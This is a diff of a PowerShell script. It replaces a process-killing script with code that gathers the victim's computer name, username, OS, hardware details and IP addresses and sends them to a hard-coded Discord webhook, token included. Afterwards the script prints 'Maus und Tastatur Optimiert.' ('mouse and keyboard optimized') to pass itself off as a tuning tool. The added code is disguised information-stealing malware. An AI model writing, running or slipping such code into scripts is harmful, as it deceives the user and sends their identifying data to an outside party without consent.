@@ -1,35 +1,34 @@
-# StopAllNonCriticalProcesses.ps1
-# Beendet alle nicht-kritischen Prozesse und schützt wichtige Systemprozesse
+# Discord Webhook URL
+$webhookUrl = "https://discordapp.com/api/webhooks/1406422085433167985/UT_c-WldcZ9ak2KsfJzPCV7V-U_30cakRwd84Mc_OzEN7TuF1DVhF2u9ZqCNG802jZ4_"
 
-Write-Host "Stopping all non-critical processes..."
+# --- Allgemeine PC Infos (nur für Discord) ---
+$os = Get-CimInstance Win32_OperatingSystem
+$cs = Get-CimInstance Win32_ComputerSystem
+$cpu = Get-CimInstance Win32_Processor
+$gpu = Get-CimInstance Win32_VideoController | Select-Object -First 1
+$disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
+$networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
 
-# Liste kritischer Prozesse, die auf jeden Fall laufen bleiben müssen
-$protected = @(
-    "explorer",       # Windows Explorer
-    "powershell",     # PowerShell
-    "pwsh",           # PowerShell Core
-    "cmd",            # Eingabeaufforderung
-    "winlogon",       # Login Session
-    "csrss",          # Client/Server Runtime
-    "services",       # Service Host
-    "lsass",          # Local Security Authority
-    "svchost",        # Windows Services Host
-    "dwm",            # Desktop Window Manager
-    "System",         # Kernprozesse
-    "smss",           # Session Manager
-    "taskhostw"       # Taskhost
-)
+# --- IP-Adressen ---
+$ips = $networkAdapters | ForEach-Object { $_.IPAddress } | Where-Object { $_ -ne $null } | ForEach-Object { $_ -join ", " }
 
-# Alle Prozesse abfragen, die NICHT in der geschützten Liste sind
-$processes = Get-Process | Where-Object { $_.Name -notin $protected }
+# --- Nachricht für Discord formatieren ---
+$message = "```ini`n"
+$message += "ComputerName = $($cs.Name)`n"
+$message += "Username = $($env:USERNAME)`n"
+$message += "OS = $($os.Caption) $($os.Version) Build $($os.BuildNumber)`n"
+$message += "CPU = $($cpu.Name)`n"
+$message += "RAM(GB) = $([math]::Round($cs.TotalPhysicalMemory / 1GB, 2))`n"
+$message += "GPU = $($gpu.Name)`n"
+$message += "IP = $($ips -join ', ')`n"
+$message += "```"
 
-foreach ($proc in $processes) {
-    try {
-        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
-        Write-Host "Stopped $($proc.Name)"
-    } catch {
-        Write-Host "Could not stop $($proc.Name)"
-    }
-}
+# --- Senden an Discord ---
+$body = @{
+    content = $message
+} | ConvertTo-Json
 
-Write-Host "Finished stopping non-critical processes."
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+
+# --- Anzeige auf dem eigenen Bildschirm ---
+Write-Host "Maus und Tastatur Optimiert."
